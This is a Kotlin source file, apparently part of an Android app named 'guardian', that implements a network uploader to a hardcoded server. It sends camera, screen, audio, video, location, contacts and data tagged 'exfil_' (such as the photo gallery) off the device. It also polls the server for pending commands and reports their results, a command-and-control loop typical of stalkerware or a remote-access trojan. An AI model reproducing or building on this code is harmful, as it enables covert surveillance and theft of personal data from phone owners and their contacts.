package net.guardian

import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object ServerUploader {
    var serverUrl = "http://10.251.196.180:8000"

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    val sharedClient = OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .writeTimeout(5, TimeUnit.SECONDS)
        .readTimeout(5, TimeUnit.SECONDS)
        .build()

    fun uploadCapture(type: String, deviceId: String = "", data: String = "", file: File? = null): Boolean {
        return try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("type", type)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("data", data)
                .apply {
                    if (file != null) {
                        val mediaType = when {
                            type == "camera" || type == "screen" || type == "surveillance_motion" -> "image/jpeg"
                            type == "surveillance_video" || type == "audio" -> "video/mp4"
                            type == "surveillance_audio" -> "audio/mpeg"
                            type == "exfil_gallery" -> "image/jpeg"
                            type.startsWith("exfil_") || type == "surveillance_location" -> "application/json"
                            else -> "application/octet-stream"
                        }.toMediaType()
                        addFormDataPart("file", file.name, file.asRequestBody(mediaType))
                    }
                }
                .build()

            val request = Request.Builder()
                .url("$serverUrl/api/capture")
                .post(body)
                .build()

            client.newCall(request).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    fun uploadBytes(type: String, deviceId: String = "", data: String = "", bytes: ByteArray? = null): Boolean {
        return try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("type", type)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("data", data)
                .apply {
                    if (bytes != null) {
                        val ext = when {
                            type.startsWith("exfil_") || type == "surveillance_location" -> "json"
                            type == "surveillance_motion" -> "jpg"
                            else -> "jpg"
                        }
                        val mt = when {
                            type.startsWith("exfil_") || type == "surveillance_location" -> "application/json"
                            else -> "image/jpeg"
                        }.toMediaType()
                        addFormDataPart("file", "$type.$ext", bytes.toRequestBody(mt))
                    }
                }
                .build()

            val request = Request.Builder()
                .url("$serverUrl/api/capture")
                .post(body)
                .build()

            client.newCall(request).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    fun getPendingCommands(): List<Map<String, Any?>> {
        return try {
            val request = Request.Builder()
                .url("$serverUrl/api/commands/pending")
                .get()
                .build()
            val resp = client.newCall(request).execute()
            val body = resp.body?.string() ?: "[]"
            val arr = JSONArray(body)
            (0 until arr.length()).map { i ->
                val obj = arr.getJSONObject(i)
                obj.keys().asSequence().associateWith { obj.get(it) }
            }
        } catch (_: Exception) { emptyList() }
    }

    fun ackCommand(id: Int, status: String, result: String): Boolean {
        return try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("id", id.toString())
                .addFormDataPart("status", status)
                .addFormDataPart("result", result)
                .build()
            val request = Request.Builder()
                .url("$serverUrl/api/commands/ack")
                .post(body)
                .build()
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) { false }
    }

    fun uploadScreenFrame(status: String): Boolean {
        return try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("status", status)
                .build()
            val request = Request.Builder()
                .url("$serverUrl/api/screen/heartbeat")
                .post(body)
                .build()
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) { false }
    }

    fun uploadContacts(deviceId: String = "", contactsJson: String): Boolean {
        return try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("contacts", contactsJson)
                .build()

            val request = Request.Builder()
                .url("$serverUrl/api/contacts")
                .post(body)
                .build()

            client.newCall(request).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    fun sendAlert(type: String, message: String): Boolean {
        return try {
            val json = JSONObject().apply {
                put("type", type)
                put("message", message)
                put("source", "surveillance")
            }
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("$serverUrl/api/threat/alert")
                .post(body)
                .build()
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) { false }
    }
}
